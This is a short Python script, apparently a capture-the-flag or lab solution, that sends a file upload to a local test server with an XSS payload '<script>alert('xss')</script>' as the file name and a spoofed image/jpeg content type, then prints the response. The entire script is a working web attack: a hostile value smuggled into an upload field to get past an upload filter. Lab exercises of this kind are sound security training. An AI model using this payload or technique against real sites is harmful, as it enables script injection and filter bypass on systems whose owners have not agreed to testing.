#!/usr/bin/env python3

import requests

url = 'http://192.168.99.100/?page=upload'

f = { 
        'uploaded':                                 # .. from <form> element in html
            ("<script>alert('xss')</script>",       # file name
                'file_contents',                    # actual file contents, normaly `open(fn, 'rb')`
                'image/jpeg')                       # content-type
        }

d = {
        'Upload': 'Upload'                          # from <form> element in html
        }

r = requests.post(url, files=f, data=d)
print(r.text)
